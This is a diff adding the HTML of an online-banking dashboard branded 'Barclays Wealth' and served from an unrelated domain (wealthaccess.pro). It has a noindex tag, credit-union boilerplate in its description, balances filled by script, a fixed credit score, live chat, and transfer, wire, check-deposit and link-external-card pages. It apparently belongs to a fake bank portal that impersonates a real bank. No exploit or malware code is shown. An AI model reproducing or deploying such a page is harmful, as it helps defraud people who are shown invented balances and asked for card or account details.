@@ -1,0 +1,1037 @@
+<!DOCTYPE html>
+<html lang="en-US" class="js">
+    <head>
+    <meta name="robots" content="noindex, nofollow">
+    <meta charset="utf-8">
+    <meta name="author" content="Smart">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="This Credit Union is federally insured by the National Credit Union Administration. We do business in accordance with the Fair Housing Law and Equal opportunity Credit Act.">
+        <link rel="icon" href="/assets/images/logo.png" />
+
+    <!-- Fav Icon  -->
+    <link rel="shortcut icon" href="https://wealthaccess.pro/en/account/myaccount/onlineacces/images/favicon.png">
+    <!-- Page Title  -->
+    <title>Barclays Wealth  | Secure Online System</title>
+    <!-- StyleSheets  -->
+    <link rel="stylesheet" href="https://wealthaccess.pro/en/account/myaccount/onlineacces/scss/sweetalert.css">
+    <link rel="stylesheet" href="https://wealthaccess.pro/en/account/myaccount/onlineacces/assets/css/dashlite.css?ver=2.4.0">
+    <link id="skin-default" rel="stylesheet" href="https://wealthaccess.pro/en/account/myaccount/onlineacces/assets/css/theme.css?ver=2.4.0">
+     <!--<link rel="stylesheet" type="text/css" href="assets/css/libs/fontawesome-icons.css"> -->
+     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+     <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
+    />
+
+
+<!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = 'd553c5070f6a39abb09396691a6327737271a601';
+window.smartsupp||(function(d) {
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+<noscript>Powered by <a href="https://www.smartsupp.com" target="_blank">Smartsupp</a></noscript>
+
+
+     <link href="https://wealthaccess.pro/en/account/myaccount/onlineacces/css/toastr.css" rel="stylesheet"/>
+
+     <style>
+        .balance-flow {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+}
+
+.balance-flow__donut {
+  width: 140px;
+  height: 140px;
+  border-radius: 50%;
+  background: conic-gradient(#1ee0ac 0deg, #f4aaa4 0deg);
+  position: relative;
+  flex-shrink: 0;
+}
+
+.balance-flow__donut::after {
+  content: "";
+  position: absolute;
+  inset: 18px;
+  background: #fff; /* if dark mode, change this */
+  border-radius: 50%;
+}
+
+.balance-flow__center {
+  position: absolute;
+  inset: 0;
+  display: grid;
+  place-items: center;
+  text-align: center;
+  z-index: 2;
+  font-weight: 700;
+}
+
+.balance-flow__meta {
+  display: grid;
+  gap: 10px;
+}
+
+.flow-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.flow-dot {
+  width: 10px;
+  height: 10px;
+  border-radius: 3px;
+}
+
+.flow-dot.credit { background: #1ee0ac; }
+.flow-dot.debit  { background: #f4aaa4; }
+
+.flow-label {
+  font-size: 13px;
+  color: #526484;
+}
+
+.flow-value {
+  font-size: 15px;
+  font-weight: 700;
+  color: #111;
+}
+
+     </style>
+
+   </head>
+    <link rel="stylesheet" href="https://www.jqueryscript.net/demo/jQuery-International-Telephone-Input-With-Flags-Dial-Codes/build/css/intlTelInput.css">
+   <script type="text/javascript">
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, 'google_translate_element');
+}
+</script>
+<script type="text/javascript" src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+    <style>
+.goog-te-gadget-simple {
+border:none;
+}
+.goog-te-gadget-simple a {
+color:#000;
+}
+</style>
+<style type="text/css">
+    .btn-primary{
+        background-color: #033d75;
+    }
+    .btn-secondary{
+        background-color: #d13636;
+    }
+    .btn-secondary:hover{opacity: 0.6;}
+    .btn-primary:hover{opacity: 0.6;}
+</style>
+
+<style>
+  .tx-modal.d-none { display:none; }
+.tx-modal { position:fixed; inset:0; z-index:9999; }
+
+.tx-backdrop{
+  position:absolute; inset:0;
+  background: rgba(0,0,0,.55);
+  backdrop-filter: blur(2px);
+}
+
+.tx-sheet{
+  position:relative;
+  width:min(520px, calc(100% - 18px));
+  margin: 1vh auto;
+  border-radius: 16px;
+  overflow:hidden;
+  box-shadow: 0 20px 80px rgba(0,0,0,.28);
+  background:#fff;
+}
+
+.tx-topbar{
+  background: linear-gradient(90deg, #0d6efd, #0b5ed7);
+  color:#fff;
+  padding: 14px 16px;
+  display:flex;
+  justify-content:space-between;
+  align-items:flex-start;
+  gap:12px;
+}
+
+.tx-topbar__title{ font-weight:800; font-size:16px; line-height:1.1; }
+.tx-topbar__sub{ opacity:.9; font-size:12px; margin-top:2px; }
+
+.tx-x{
+  width:34px; height:34px;
+  border-radius: 10px;
+  border: 1px solid rgba(255,255,255,.35);
+  background: rgba(255,255,255,.12);
+  color:#fff;
+  font-size: 22px;
+  line-height: 1;
+  display:grid;
+  place-items:center;
+  cursor:pointer;
+}
+
+.tx-content{ padding: 14px; background: #f6f7fb; }
+
+.tx-receipt{
+  background:#fff;
+  border-radius: 14px;
+  padding: 16px;
+  border: 1px solid rgba(0,0,0,.06);
+}
+
+.tx-receipt__title{
+  text-align:center;
+  font-size:18px;
+  font-weight:900;
+  margin-top: 2px;
+}
+
+.tx-receipt__ref{
+  text-align:center;
+  color:#6c757d;
+  font-size:12px;
+  margin-top: 6px;
+}
+
+.tx-amount{
+  text-align:center;
+  font-weight: 900;
+  font-size: 32px;
+  margin-top: 12px;
+  letter-spacing: -0.5px;
+}
+
+.tx-status{
+  width: fit-content;
+  margin: 10px auto 0;
+  padding: 7px 16px;
+  border-radius: 999px;
+  font-weight: 800;
+  font-size: 12px;
+  text-transform: uppercase;
+}
+
+.tx-status--success{ background:#e9f9ef; color:#157347; border:1px solid #b7ebc6; }
+.tx-status--pending{ background:#fff7e6; color:#b36b00; border:1px solid #ffe0a3; }
+.tx-status--failed{ background:#fdecec; color:#b02a37; border:1px solid #f5b5bb; }
+.tx-status--draft{ background:#e7f1ff; color:#0b5ed7; border:1px solid #b6d4fe; }
+
+.tx-divider{
+  height:1px;
+  background: rgba(0,0,0,.08);
+  margin: 14px 0;
+}
+
+.tx-kv{ display:flex; flex-direction:column; gap: 10px; }
+
+.tx-row{
+  display:flex;
+  justify-content:space-between;
+  gap: 12px;
+  font-size: 13px;
+}
+
+.tx-key{ color:#6c757d; font-weight:700; }
+.tx-val{ font-weight:800; color:#111; text-align:right; max-width: 62%; word-break: break-word; }
+
+.tx-download{
+  width: 100%;
+  margin-top: 14px;
+  border: none;
+  padding: 12px 14px;
+  border-radius: 12px;
+  background: linear-gradient(180deg, #1f7bff, #0d6efd);
+  color:#fff;
+  font-weight: 900;
+  box-shadow: 0 12px 25px rgba(13,110,253,.25);
+  cursor:pointer;
+}
+
+.tx-footnote{
+  text-align:center;
+  font-size: 11px;
+  color:#8a8f98;
+  margin-top: 12px;
+}
+
+@media (max-width: 520px){
+  .tx-sheet{ margin: 6vh auto; }
+  .tx-amount{ font-size: 28px; }
+}
+
+</style>
+
+<style>
+  .tranx-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 12px;
+    font-size: 13px;
+  }
+  @media (max-width: 768px) {
+    .tranx-row {
+      flex-direction: column;
+      align-items: flex-start;
+    }
+    
+  }
+</style>
+
+<style>
+  .tranx-label {
+  display: block;          /* IMPORTANT */
+  max-width: 180px;        /* control width */
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  min-width: 0;            /* for flexbox */
+}
+
+</style>
+<body class="nk-body npc-crypto bg-white has-sidebar ">
+    <div class="nk-app-root">
+        <!-- main @s -->
+        <div class="nk-main ">
+            <!-- sidebar @s -->
+           <div class="nk-sidebar nk-sidebar-fixed " data-content="sidebarMenu">
+  <div class="nk-sidebar-element nk-sidebar-head" style="border-bottom: solid #fe473a;">
+    <div class="nk-sidebar-brand">
+      <a href="/en/account/myaccount/onlineacces/" class="logo-link nk-sidebar-logo">
+        <img class="logo-light logo-img" src="/assets/images/logo.png" alt="logo">
+        <img class="logo-dark logo-img" src="/assets/images/logo.png" alt="logo-dark">
+      </a>
+    </div>
+    <div class="nk-menu-trigger mr-n2">
+      <a href="#" class="nk-nav-toggle nk-quick-nav-icon d-xl-none" data-target="sidebarMenu">
+        <i class="fa-solid fa-arrow-left"></i>
+      </a>
+    </div>
+  </div><!-- .nk-sidebar-element -->
+
+  <div class="nk-sidebar-element">
+    <div class="nk-sidebar-body" data-simplebar>
+      <div class="nk-sidebar-content">
+
+        <div class="nk-sidebar-widget d-none d-xl-block">
+          <div class="user-account-info between-center">
+            <div class="user-account-main">
+              <h6 class="overline-title-alt">Available Balance</h6>
+              <div class="user-balance">
+                <span class="user-account-balance"></span>
+                <small class="currency currency-btc">USD</small>
+              </div>
+              <!--<div class="user-balance-alt">150,965 <span class="currency currency-btc">USD</span></div>-->
+            </div>
+            <a href="#" class="btn btn-white btn-icon btn-light">
+              <i class="fa-solid fa-chart-line"></i>
+            </a>
+          </div>
+
+          <ul class="user-account-data gy-1">
+            <li>
+              <div class="user-account-label">
+                <span class="sub-text">Income</span>
+              </div>
+              <div class="user-account-value">
+                <span class="text-success ml-2">0 % <i class="fa-solid fa-arrow-up-long"></i></span>
+              </div>
+            </li>
+            <li>
+              <div class="user-account-label">
+                <span class="sub-text">Debits</span>
+              </div>
+              <div class="user-account-value">
+                <span class="text-danger ml-2">0 % <i class="fa-solid fa-arrow-down-long"></i></span>
+              </div>
+            </li>
+          </ul>
+
+          <div class="user-account-actions">
+            <ul class="g-3">
+              <li><a href="/en/account/myaccount/onlineacces/transfer.html" class="btn btn-lg btn-primary"><span><i class="fas fa-money-bill-alt"></i> Transfer</span></a></li>
+              <li><a href="/en/account/myaccount/onlineacces/pay-bills.html" class="btn btn-lg btn-secondary"><span><i class="fas fa-file-invoice-dollar"></i> Pay Bills</span></a></li>
+            </ul>
+          </div>
+        </div><!-- .nk-sidebar-widget -->
+
+        <div class="nk-sidebar-widget nk-sidebar-widget-full d-xl-none pt-0">
+          <a class="nk-profile-toggle toggle-expand" data-target="sidebarProfile" href="#">
+            <div class="user-card-wrap">
+              <div class="user-card">
+                <div class="user-avatar">
+                  <span class="user-fullname-in-short"></span>
+                </div>
+                <div class="user-info">
+                  <span class="lead-text user-fullname"></span>
+                  <span class="sub-text user-account-number"></span>
+                </div>
+                <div class="user-action">
+                  <i class="fa-solid fa-chevron-down"></i>
+                </div>
+              </div>
+            </div>
+          </a>
+
+          <div class="nk-profile-content toggle-expand-content" data-content="sidebarProfile">
+            <div class="user-account-info between-center">
+              <div class="user-account-main">
+                <h6 class="overline-title-alt">Available Balance</h6>
+                <div class="user-balance">
+                  <span class="user-account-balance"></span><small class="currency currency-btc">USD</small>
+                </div>
+              </div>
+              <a href="#" class="btn btn-icon btn-light">
+                <i class="fa-solid fa-chart-line"></i>
+              </a>
+            </div>
+
+            <ul class="user-account-data">
+              <li>
+                <div class="user-account-label">
+                  <span class="sub-text">income</span>
+                </div>
+                <div class="user-account-value">
+                  <span class="text-success ml-2">0 % <i class="fa-solid fa-arrow-up-long"></i></span>
+                </div>
+              </li>
+              <li>
+                <div class="user-account-label">
+                  <span class="sub-text">Debits</span>
+                </div>
+                <div class="user-account-value">
+                  <span class="text-danger ml-2">0 % <i class="fa-solid fa-arrow-up-long"></i></span>
+                </div>
+              </li>
+            </ul>
+
+            <ul class="user-account-links">
+              <li><a href="/en/account/myaccount/onlineacces/transfer.html" class="link"><span> Transfer Funds</span> <i class="fa-solid fa-wallet"></i></a></li>
+              <li><a href="/en/account/myaccount/onlineacces/pay-bills.html" class="link"><span>Pay Bills</span> <i class="fa-solid fa-wallet"></i></a></li>
+            </ul>
+
+            <ul class="link-list">
+              <!-- <li><a href="/en/account/myaccount/onlineacces/profile.html"><i class="fa-solid fa-user"></i><span>View Profile</span></a></li> -->
+              <li><a href="/en/account/myaccount/onlineacces/account-setting.html"><i class="fa-solid fa-gear"></i><span>Account Setting</span></a></li>
+              <!-- <li><a href="activity-logs"><i class="fa-solid fa-chart-simple"></i><span>Login Activity</span></a></li> -->
+            </ul>
+
+           <ul class="link-list">
+              <li>
+                <a href="#" id="logoutBtn">
+                  <em class="fa-solid fa-right-from-bracket me-1"></em>
+                  <span>Sign out</span>
+                </a>
+              </li>
+            </ul>
+          </div>
+        </div><!-- .nk-sidebar-widget -->
+
+        <script src="/auth-scripts/logout.js"></script>
+
+        <div class="nk-sidebar-menu">
+          <!-- Menu -->
+          <ul class="nk-menu">
+            <li class="nk-menu-heading">
+              <h6 class="overline-title">Menu</h6>
+            </li>
+
+            <li class="nk-menu-item">
+              <a href="/en/account/myaccount/onlineacces/" class="nk-menu-link">
+                <span class="nk-menu-icon"><i class="fa-solid fa-gauge-high"></i></span>
+                <span class="nk-menu-text">Dashboard</span>
+              </a>
+            </li>
+
+            <li class="nk-menu-item">
+              <a href="/en/account/myaccount/onlineacces/" class="nk-menu-link">
+                <span class="nk-menu-icon"><i class="fa-solid fa-user"></i></span>
+                <span class="nk-menu-text">My Account</span>
+              </a>
+            </li>
+
+            <li class="nk-menu-item">
+              <a href="/en/account/myaccount/onlineacces/summary.html" class="nk-menu-link">
+                <span class="nk-menu-icon"><i class="fa-solid fa-chart-line"></i></span>
+                <span class="nk-menu-text">Account summary</span>
+              </a>
+            </li>
+
+            <li class="nk-menu-item">
+              <a href="/en/account/myaccount/onlineacces/transfer.html" class="nk-menu-link">
+                <span class="nk-menu-icon"><i class="fa-solid fa-right-left"></i></span>
+                <span class="nk-menu-text">Transfer</span>
+              </a>
+            </li>
+
+            <li class="nk-menu-item">
+              <a href="/en/account/myaccount/onlineacces/wire.html" class="nk-menu-link">
+                <span class="nk-menu-icon"><i class="fa-solid fa-globe"></i></span>
+                <span class="nk-menu-text">Cross-border Transfer</span>
+              </a>
+            </li>
+
+            <li class="nk-menu-item">
+              <a href="/en/account/myaccount/onlineacces/check-deposit.html" class="nk-menu-link">
+                <span class="nk-menu-icon"><i class="fa-solid fa-money-check-dollar"></i></span>
+                <span class="nk-menu-text">Deposit Check</span>
+              </a>
+            </li>
+
+            <li class="nk-menu-item">
+              <a href="/en/account/myaccount/onlineacces/pay-bills.html" class="nk-menu-link">
+                <span class="nk-menu-icon"><i class="fa-solid fa-file-invoice-dollar"></i></span>
+                <span class="nk-menu-text">Pay Bills</span>
+              </a>
+            </li>
+
+            <!-- <li class="nk-menu-item">
+              <a href="/en/account/myaccount/onlineacces/loan.html" class="nk-menu-link">
+                <span class="nk-menu-icon"><i class="fa-solid fa-hand-holding-dollar"></i></span>
+                <span class="nk-menu-text">Loan/Credit financing </span>
+              </a>
+            </li> -->
+
+            <li class="nk-menu-item">
+              <a href="/en/account/myaccount/onlineacces/card.html" class="nk-menu-link">
+                <span class="nk-menu-icon"><i class="fa-solid fa-credit-card"></i></span>
+                <span class="nk-menu-text">Link External card</span>
+              </a>
+            </li>
+
+            <li class="nk-menu-item">
+              <a href="/en/account/myaccount/onlineacces/account-setting.html" class="nk-menu-link">
+                <span class="nk-menu-icon"><i class="fa-solid fa-gear"></i></span>
+                <span class="nk-menu-text">Account Setting</span>
+              </a>
+            </li>
+
+            <li class="nk-menu-item">
+              <a href="/en/account/myaccount/onlineacces/contact.html" class="nk-menu-link">
+                <span class="nk-menu-icon"><i class="fa-solid fa-circle-question"></i></span>
+                <span class="nk-menu-text">Support</span>
+              </a>
+            </li>
+          </ul><!-- .nk-menu -->
+        </div><!-- .nk-sidebar-menu -->
+
+        <div class="nk-sidebar-footer">
+          <ul class="nk-menu nk-menu-footer">
+            <a href="#" style=""><div id="google_translate_element"></div></a>
+          </ul><!-- .nk-footer-menu -->
+        </div><!-- .nk-sidebar-footer -->
+
+      </div><!-- .nk-sidebar-content -->
+    </div><!-- .nk-sidebar-body -->
+  </div><!-- .nk-sidebar-element -->
+</div>
+
+            <!-- sidebar @e -->            <!-- wrap @s -->
+            <div class="nk-wrap ">
+                
+                
+                <!-- main header @s -->
+                <div class="nk-header nk-header-fluid nk-header-fixed is-secondary">
+  <div class="container-fluid">
+    <div class="nk-header-wrap">
+
+      <div class="nk-menu-trigger d-xl-none ml-n1">
+        <a href="#" class="nk-nav-toggle nk-quick-nav-icon" data-target="sidebarMenu">
+          <i class="fa-solid fa-bars"></i>
+        </a>
+      </div>
+
+      <div class="nk-header-brand d-xl-none">
+        <a href="#" class="logo-link">
+          <img class="logo-light logo-img" src="/assets/images/logo.png" alt="logo">
+          <img class="logo-dark logo-img" src="/assets/images/logo.png" alt="logo-dark">
+        </a>
+      </div>
+
+      <div class="nk-header-news d-none d-xl-block">
+        <div class="nk-news-list">
+          <a class="nk-news-item" href="#">
+            <div class="nk-news-icon">
+              <i class="fa-regular fa-credit-card"></i>
+            </div>
+            <div class="nk-news-text">
+              <p>
+  New features are now live.
+  <span> Explore the latest updates.</span>
+</p>
+            
+              <i class="fa-solid fa-arrow-up-right-from-square"></i>
+            </div>
+          </a>
+        </div>
+      </div>
+
+      <div class="nk-header-tools">
+        <ul class="nk-quick-nav">
+          <li class="dropdown user-dropdown">
+            <a href="#" class="dropdown-toggle" data-toggle="dropdown">
+              <div class="user-toggle">
+                <div class="user-avatar sm">
+                  <i class="fa-solid fa-user"></i>
+                </div>
+                <div class="user-info d-none d-md-block">
+                  <div class="user-status user-status-verified">Connected</div>
+
+                  <div>
+                  <span class="user-name user-fullname"></span>
+                  <i class="fa-solid fa-chevron-down"></i>
+                  </div>
+                </div>
+              </div>
+            </a>
+
+            <div class="dropdown-menu dropdown-menu-md dropdown-menu-right dropdown-menu-s1">
+
+              <div class="dropdown-inner user-card-wrap bg-lighter d-none d-md-block">
+                <div class="user-card">
+                  <div class="user-avatar">
+                    <span class="user-fullname-in-short"></span>
+                  </div>
+                  <div class="user-info">
+                    <span class="lead-text user-fullname"></span>
+                    <span class="sub-text user-account-number"></span>
+                  </div>
+                </div>
+              </div>
+
+              <div class="dropdown-inner user-account-info">
+                <h6 class="overline-title-alt">Savings Account</h6>
+                <div class="user-balance">
+                  <span class="user-account-balance"></span>
+                  <small class="currency currency-btc">USD</small>
+                </div>
+                <a href="/en/account/myaccount/onlineacces/transfer.html" class="link">
+                  <span>Transfer Funds</span>
+                  <i class="fa-solid fa-wallet"></i>
+                </a>
+              </div>
+
+              <div class="dropdown-inner">
+                <ul class="link-list">
+                  <!-- <li>
+                    <a href="/en/account/myaccount/onlineacces/profile.html">
+                      <i class="fa-solid fa-user"></i>
+                      <span>View Profile</span>
+                    </a>
+                  </li> -->
+                  <li>
+                    <a href="/en/account/myaccount/onlineacces/account-setting.html">
+                      <i class="fa-solid fa-gear"></i>
+                      <span>Account Setting</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="/en/account/myaccount/onlineacces/account-setting.html">
+                      <i class="fa-solid fa-chart-simple"></i>
+                      <span>Login Activity</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a class="dark-switch" href="/en/account/myaccount/onlineacces/activity-logs.html">
+                      <i class="fa-solid fa-moon"></i>
+                      <span>Dark Mode</span>
+                    </a>
+                  </li>
+                </ul>
+              </div>
+
+              <div class="dropdown-inner">
+                <ul class="link-list">
+                  <li>
+                    <a href="#" id="logoutBtn">
+                      <i class="fa-solid fa-right-from-bracket"></i>
+                      <span>Sign out</span>
+                    </a>
+                  </li>
+                </ul>
+              </div>
+
+            </div>
+          </li>
+        </ul>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+                <!-- main header @e -->                 
+                
+                
+                <div class="nk-content nk-content-fluid">
+                    <div class="container-xl wide-lg">
+                        <div class="nk-content-body">
+                            <div class="nk-block-head">
+                                <div class="nk-block-head-sub">
+                                </div>
+                                <div class="nk-block-between-md g-4 card-bordered">
+                                    <div class="nk-block-head-content">
+                                        <h4 class="nk-block-title fw-normal welcome-user-message"></h4>
+                                        <div class="nk-block-des">
+                                            <p>At a glance summary of your account!</p>
+                                        </div>
+                                    </div><!-- .nk-block-head-content -->
+
+                                    <div class="nk-block-head-content">
+  <ul class="nk-block-tools gx-3">
+    <li>
+      <a href="/en/account/myaccount/onlineacces/check-deposit.html" class="btn btn-primary">
+        <span>Deposit</span>
+        <i class="fa-solid fa-arrow-right-long"></i>
+      </a>
+    </li>
+    <li>
+      <a href="/en/account/myaccount/onlineacces/transfer.html" class="btn btn-secondary btn-light text-light">
+        <span>Transfer Fund</span>
+        <i class="fa-solid fa-arrow-right-long d-none d-sm-inline-block"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
+                                  <!-- .nk-block-head-content -->
+                                </div><!-- .nk-block-between -->
+                            </div><!-- .nk-block-head -->
+                            
+                            
+                                                            
+                            
+                            <div class="nk-block">
+                                <div class="row gy-gs">
+                                    <div class="col-lg-6 col-xl-6">
+                                        <div class="nk-block">
+                                            <div class="nk-block-head-xs">
+                                                <div class="nk-block-head-content">
+                                                    <h5 class="nk-block-title title">Overview</h5>
+                                                </div>
+                                            </div><!-- .nk-block-head -->
+                                            <div class="nk-block">
+                                                <div class="card card-bordered text-light is-dark h-100">
+                                                    <div class="card-inner">
+                                                        <div class="nk-wg7">
+                                                            <div class="nk-wg7-stats-group"><!-- border-radius: 50%;-->
+                                                            	<div class="nk-wg7-stats w-50"><!--  style="background-image: url(); border-color: white; border-width: 5px;" -->
+                                                                                                                                  <img
+  class="img img-rounded user-passport"
+  src="/assets/images/avatar-placeholder.png"
+  width="100"
+  style="border-color: white; border-width: 5px;"
+  alt="User passport"
+/>
+<!--border-radius:50px;-->
+                                                                                                                       </div>
+                                                            <div class="nk-wg7-stats w-50">
+                                                                <div class="nk-wg7-title">Available balance</div>
+                                                                <div class="number-lg amount">USD 
+                                                                    <span class="user-account-balance"></span></div>
+                                                                <p class="user-fullname"></p>
+                                                                                                                         </div> 
+                                                            </div>
+                                                            <div class="nk-wg7-stats-group">
+                                                                <div class="nk-wg7-stats w-50">
+                                                                    <div class="nk-wg7-title">Linked Cards</div>
+                                                                    <div class="number-lg user-cardCount"></div>
+                                                                </div>
+                                                                <div class="nk-wg7-stats w-50"> 
+                                                                    <div class="nk-wg7-title">Your Account Number</div>
+                                                                    <div class="user-account-number"></div>
+                                                                </div>
+                                                            </div>
+                                                        </div><!-- .nk-wg7 -->
+                                                    </div><!-- .card-inner -->
+                                                </div><!-- .card -->
+                                            </div><!-- .nk-block -->
+                                        </div><!-- .nk-block -->
+                                    </div><!-- .col -->
+                                     <div class="col-lg-6 col-xl-6">
+                                        <div class="nk-block">
+                                            <div class="nk-block-head-xs">
+                                                <div class="nk-block-between-md g-2">
+                                                    <div class="nk-block-head-content">
+                                                        <h5 class="nk-block-title title">Savings Account</h5>
+                                                    </div>
+                                                    <div class="nk-block-head-content">
+                                                        <a href="/en/account/myaccount/onlineacces/transfer.html" class="link link-primary">Transfer Fund</a>
+                                                    </div>
+                                                </div>
+                                            </div><!-- .nk-block-head -->
+                                            <div class="row g-2">
+                                                <div class="col-sm-12">
+                                                    <div class="card bg-light">
+                                                        <div class="nk-wgw sm">
+                                                            <a class="nk-wgw-inner" href="#">
+                                                                <div class="nk-wgw-name">
+                                                                    <div class="nk-wgw-icon">
+                                                                        <i class="fa-solid fa-credit-card"></i>
+       </div>
+                                                                    <h5 class="nk-wgw-title title user-account-number"></h5>
+                                                                </div>
+                                                                <div class="nk-wgw-balance">
+                                                                    <div class="amount"> <span class="user-account-balance"></span>     <span class="currency currency-nio">USD</span></div>
+                                                                </div>
+                                                            </a>
+                                                        </div>
+                                                    </div>
+                                                </div><!-- .col -->
+                                            </div><!-- .row -->
+                                        </div><!-- .nk-block -->
+                                        <div class="nk-block nk-block-md">
+                                            <div class="nk-block-head-xs">
+                                                <div class="nk-block-between-md g-2">
+                                                    <div class="nk-block-head-content">
+                                                        <h6 class="nk-block-title title">Loans and lines of credit</h6>
+                                                    </div>
+                                                    <div class="nk-block-head-content">
+                                                        <a href="/en/account/myaccount/onlineacces/pay-bills.html" class="link link-primary">Pay bills</a>
+                                                    </div>
+                                                </div>
+                                            </div><!-- .nk-block-head -->
+                                            <div class="row g-2">
+                                                
+                                             
+                                                <div class="col-sm-6">
+                                                    <div class="card bg-light">
+                                                        <div class="nk-wgw sm">
+                                                            <a class="nk-wgw-inner" href="#">
+                                                                <div class="nk-wgw-name">
+                                                                    <div class="nk-wgw-icon">
+                                                                        <i class="fa-solid fa-credit-card"></i>
+
+                                                                    </div>
+                                                                    <h5 class="nk-wgw-title title"> FICO Credit Score</h5>
+                                                                </div>
+                                                                <div class="nk-wgw-balance">
+                                                                    <div class="amount text-dark">750 &nbsp;<span class="badge-pill bg-success"> </span></div>
+                                                                </div>
+                                                            </a>
+                                                        </div>
+                                                    </div>
+                                                </div><!-- .col -->
+                                            </div><!-- .row -->
+                                        </div> <!-- .nk-block -->
+                                    </div><!-- .col -->
+                                </div><!-- .row -->
+                            </div><!-- .nk-block -->
+                             <div class="nk-block nk-block-lg">
+                                <div class="row gy-gs">
+                                    <div class="col-md-6">
+                                        <div class="card-head">
+                                            <div class="card-title  mb-0">
+                                                <h5 class="title">Recent Transaction Activities</h5>
+                                            </div>
+                                            <div class="card-tools">
+                                                <ul class="card-tools-nav">
+                                                    <li class="active"><a href="/en/account/myaccount/onlineacces/summary.html">View All</a></li>
+                                                </ul>
+                                            </div>
+                                        </div>
+
+                                        <div class="tranx-list card card-bordered">
+                                           <div id="recentTransactions"></div>
+                                         </div>
+
+                                         <!-- ✅ Modal mount (paste once on the page, preferably near bottom body) -->
+<div id="txModal" class="tx-modal d-none" aria-hidden="true">
+  <div class="tx-backdrop" data-close="1"></div>
+
+  <div class="tx-sheet" role="dialog" aria-modal="true" aria-labelledby="txTitle">
+    <div class="tx-topbar">
+      <div>
+        <div class="tx-topbar__title">Receipt Information</div>
+        <div class="tx-topbar__sub">Full transaction details</div>
+      </div>
+      <button class="tx-x" type="button" aria-label="Close" data-close="1">×</button>
+    </div>
+
+    <div class="tx-content">
+      <div class="tx-receipt">
+        <div class="tx-receipt__title">Transaction Receipt</div>
+        <div class="tx-receipt__ref">Ref: <span id="txRefText">-</span></div>
+
+        <div class="tx-amount" id="txAmountText">—</div>
+        <div class="tx-status" id="txStatusPill">—</div>
+
+        <div class="tx-divider"></div>
+
+        <!-- key/value rows -->
+        <div class="tx-kv" id="txKvMount"></div>
+
+        <button id="txReceiptBtn" type="button" class="tx-download">
+          ⬇ Download Receipt (PDF)
+        </button>
+
+        <div class="tx-footnote">Powered by Barclays Wealth</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+                                    </div>
+                                    <div class="col-md-6">
+                                        <div class="card-head">
+                                            <div class="card-title mb-0">
+                                                <h5 class="title">Balance Flow</h5>
+                                            </div>
+                                            <!-- <div class="card-tools">
+                                                <ul class="card-tools-nav">
+                                                    <li class="active"><a href="#">All time</a></li>
+                                                </ul>
+                                            </div> -->
+                                        </div><!-- .card-title -->
+                                        <div class="card card-bordered">
+                                            <div class="card-inner">
+                                                <div class="nk-wg4">
+                                                    <div class="nk-wg4-group justify-center gy-3 gx-4">
+                                                        <div class="nk-wg4-item">
+                                                            <div class="sub-text">
+                                                                <div class="dot dot-lg sq" data-bg="#1ee0ac"></div> <span>Credit</span>
+                                                            </div>
+                                                        </div>
+                                                        <div class="nk-wg4-item">
+                                                            <div class="sub-text">
+                                                                <div class="dot dot-lg sq" data-bg="#f4aaa4"></div> <span>Debit</span>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="nk-ck3">
+                                                    <!-- <canvas class="pie-chart" id="pieChartData"></canvas> -->
+                                                     <div id="balanceFlowMount"></div>
+
+                                                </div>
+                                            </div><!-- .card-inner -->
+                                        </div><!-- .card -->
+                                        <p></p>
+<div class="tradingview-widget-container" style="width: 100%;">
+  <div class="tradingview-widget-container__widget"></div>
+  <div class="tradingview-widget-copyright"><a href="https://www.tradingview.com/symbols/EURUSD/?exchange=FX" rel="noopener" target="_blank"><span class="blue-text">EURUSD Rates</span></a></div>
+  <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-mini-symbol-overview.js" async>
+  {
+  "symbol": "FX:EURUSD",
+  "width": 320 ,
+  "height": 220,
+  "locale": "en",
+  "dateRange": "12M",
+  "colorTheme": "dark",
+  "trendLineColor": "rgba(41, 98, 255, 1)",
+  "underLineColor": "rgba(41, 98, 255, 0.3)",
+  "underLineBottomColor": "rgba(41, 98, 255, 0)",
+  "isTransparent": false,
+  "autosize": true,
+  "largeChartUrl": ""
+}
+  </script>
+</div>
+<!-- TradingView Widget END -->
+                      </div><!-- .col -->
+                                </div><!-- .row -->
+                            </div><!-- .nk-block -->
+                            <div class="nk-block">
+                                <div class="card card-bordered">
+                                    <div class="card-inner card-inner-lg">
+                                        <div class="align-center flex-wrap flex-md-nowrap g-4">
+                                            <div class="nk-block-image w-120px flex-shrink-0">
+                                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 118">
+                                                    <path d="M8.916,94.745C-.318,79.153-2.164,58.569,2.382,40.578,7.155,21.69,19.045,9.451,35.162,4.32,46.609.676,58.716.331,70.456,1.845,84.683,3.68,99.57,8.694,108.892,21.408c10.03,13.679,12.071,34.71,10.747,52.054-1.173,15.359-7.441,27.489-19.231,34.494-10.689,6.351-22.92,8.733-34.715,10.331-16.181,2.192-34.195-.336-47.6-12.281A47.243,47.243,0,0,1,8.916,94.745Z" transform="translate(0 -1)" fill="#f6faff" />
